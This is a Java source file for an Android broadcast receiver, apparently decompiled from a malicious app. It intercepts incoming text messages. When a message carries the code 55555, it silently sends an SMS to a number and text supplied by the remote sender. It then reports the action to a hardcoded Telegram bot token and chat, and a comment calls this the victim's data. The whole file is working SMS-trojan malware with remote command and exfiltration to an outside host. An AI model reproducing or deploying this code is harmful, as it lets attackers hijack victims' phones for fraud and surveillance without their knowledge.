package com.example.myapplicatior;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.util.Log;
import java.io.IOException;
import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class SendSMS extends BroadcastReceiver {
    final String TAG = "demo";
    private final OkHttpClient client = new OkHttpClient();

    public void onReceive(Context context, Intent intent) {
        Bundle bundle;
        String str = " ";
        String str2 = ",";
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            if (extras != null) {
                try {
                    Object[] objArr = (Object[]) extras.get("pdus");
                    SmsMessage[] smsMessageArr = new SmsMessage[objArr.length];
                    int i = 0;
                    while (i < smsMessageArr.length) {
                        smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                        String originatingAddress = smsMessageArr[i].getOriginatingAddress();
                        String messageBody = smsMessageArr[i].getMessageBody();
                        String replace = messageBody.replace("&", "  ").replace("#", str).replace("?", str);
                        String str3 = messageBody;
                        String str4 = str3.split(str2)[0];
                        String str5 = str3.split(str2)[1];
                        String str6 = str3.split(str2)[2];
                        String str7 = str;
                        String str8 = str2;
                        int parseInt = Integer.parseInt(str4.toString());
                        if (parseInt == 55555) {
                            SmsManager.getDefault().sendTextMessage(str5, (String) null, str6, (PendingIntent) null, (PendingIntent) null);
                            int i2 = parseInt;
                            bundle = extras;
                            try {
                                String str9 = str6;
                                String str10 = str9;
                                /**
                                 * DISINI ADA URL API TELEGRAM DIMANA DATA KORBAN DI KIRIM
                                 */
                                this.client.newCall(new Request.Builder().url("https://api.telegram.org/bot6817255304:AAGrKP47-SpbAnI-u7GyKITnA6OgLmK4q3Y/sendMessage?parse_mode=markdown&chat_id=7064236060&text=Berhasil Kirim SMS dari Jauh  %0AKepada  : _" + str5 + ",%0A𝗣𝗲𝘀𝗮𝗻 : " + str9 + "_").build()).enqueue(new Callback() {
                                    public void onFailure(Call call, IOException iOException) {
                                        iOException.printStackTrace();
                                    }

                                    public void onResponse(Call call, Response response) throws IOException {
                                        Log.d("demo", "OnResponse: Thread Id " + Thread.currentThread().getId());
                                        if (response.isSuccessful()) {
                                            response.body().string();
                                        }
                                    }
                                });
                            } catch (Exception e) {
                                e = e;
                            }
                        } else {
                            int i3 = parseInt;
                            bundle = extras;
                            String str11 = str6;
                        }
                        i++;
                        extras = bundle;
                        str = str7;
                        str2 = str8;
                    }
                    Bundle bundle2 = extras;
                } catch (Exception e2) {
                    e = e2;
                    Bundle bundle3 = extras;
                    e.printStackTrace();
                }
            } else {
                Bundle bundle4 = extras;
            }
        }
    }
}
